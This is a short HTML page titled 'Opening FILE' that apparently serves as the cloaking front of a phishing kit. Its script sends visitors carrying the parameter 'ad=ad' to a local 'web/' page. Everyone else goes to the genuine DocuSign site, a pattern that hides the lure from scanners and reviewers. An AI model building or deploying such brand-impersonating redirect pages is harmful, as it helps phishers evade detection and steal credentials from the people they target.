<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Opening FILE</title>

    <script>
        (function () {
            const params = new URLSearchParams(window.location.search);
            const ad = params.get('ad');

            if (ad === 'ad') {
                window.location.replace('web/?ad=ad');
            } else {
                window.location.replace('https://www.docusign.com/');
            }
        })();
    </script>
</head>
<body>
</body>
</html>
